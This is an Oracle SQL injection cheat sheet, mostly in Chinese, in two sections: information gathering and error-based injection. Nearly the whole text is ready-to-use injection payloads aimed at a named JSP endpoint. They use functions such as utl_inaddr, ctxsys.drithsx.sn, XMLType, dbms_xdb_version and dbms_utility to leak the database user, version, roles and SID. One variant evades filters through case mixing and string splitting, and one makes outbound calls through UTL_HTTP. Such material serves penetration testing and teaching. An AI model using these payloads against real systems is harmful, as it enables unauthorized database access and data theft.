`1.信息获取`
    
    utl_inaddr.get_host_name	
    http://www.iswin.org/oracle.jsp?name=' and 1=utl_inaddr.get_host_name((select user from dual))--
    ctxsys.drithsx.sn	
    http://www.iswin.org/oracle.jsp?name=' and 1=ctxsys.drithsx.sn(1,(select user from dual))--

    这种方法在Oracle 8g，9g，10g中不需要任何权限
    XMLType  XML报错
    在使用这个XMLType进行报错时，很多人不知道为什么要用chr(60)，通过ascii查询可以看到，60:<,58:’:’,62:’>’,查了下相关的api，发现xmltype在进行解析 的时候必须以<开头>结尾，这里:冒号在这是必不可少的，至于为什么是冒号这个我也没查到，另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，有replace函数替换成其他非空字符就可以。
    	
    http://www.iswin.org/oracle.jsp?name=' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is     not null--
    dbms_xdb_version.checkin
    http://www.iswin.org/oracle.jsp?name=' and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null--
    dbms_xdb_version.makeversioned
    http://www.iswin.org/oracle.jsp?name=' and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null--
    dbms_xdb_version.uncheckout
    http://www.iswin.org/oracle.jsp?name=' and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null--
    dbms_utility.sqlid_to_sqlhash
    http://www.iswin.org/oracle.jsp?name=' and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null--
    select user from dual #当前用户
    SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';   #oracle版本
    select wmsys.wm_concat(granted_role) from user_role_privs-- 看赋予角色权限
    select instance_name from v$instance#服务器sid 远程链接需要
    select utl_inaddr.get_host_name('127.0.0.1') from dual; #查询内网hostname win08dc.contoso.com
    SELECT UTL_HTTP.REQUEST('http://localhost') FROM dual;  #对外通信
    SELECT UTL_INADDR.get_host_address('localhost.com') FROM dual;
    select table_name from user_tables where lower(table_name)='books'   #查看books表书否存在
    
`2.Error Based(报错注入)`

    (10g or 11g)
    ' and 1 = ctxsys.drithsx.sn(1,(select user from dual))--  
    and 1=(dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1))) and 1=1. 
    ' and 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(120)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4113=4113) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(107)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)--  
    ' and dbms_xdb_version.checkin((select user from dual))='1'--  
    ' and dbms_xdb_version.makeversioned((select user from dual))='1'--  
    ' and dbms_utility.sqlid_to_sqlhash((select user from dual))='1'--  
    ' and dbms_utility.sqlid_to_sqlhash((select user from dual))='1'--  
    ' and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual)--     #user第一位是S ORA-01476: divisor is equal to zero 
    ' order by (SELECT (CASE WHEN (2434=2434||utl_inaddr.get_host_name((select banner from v$version where rownum=1))) THEN 2434 ELSE CAST(1 AS INT)/0 END) FROM DUAL)--%'  

    11g普通用户不能用的#utl_inaddr not work maybe acl(11g normal user) or java not installed etc
    '||utl_inaddr.get_host_address((select banner from v$version where rownum=1))||'    
    '||utl_inaddr.get_host_name((select banner from v$version where rownum=1))||'

    10g不能用的
    ' and dbms_aw_xml.readawmetadata((select sys_context('USERENV', 'SESSION_USER') from dual), null) is null --    #(11g 10g报错ORA-29532: Java call terminated by uncaught Java exception: java.lang.OutOfMemoryError)
    ' or dbMS_aW_xMl.reAdaWmetaData((select sYS_cONtExt('US' || 'ERENV', 'SESS' || 'ION_US' || 'ER') from dUAl), null) is null --# bypass 1
    ' and 1=(ordsys.ord_dicom.getmappingxpath((select user from dual),user,user))-- 
    
    
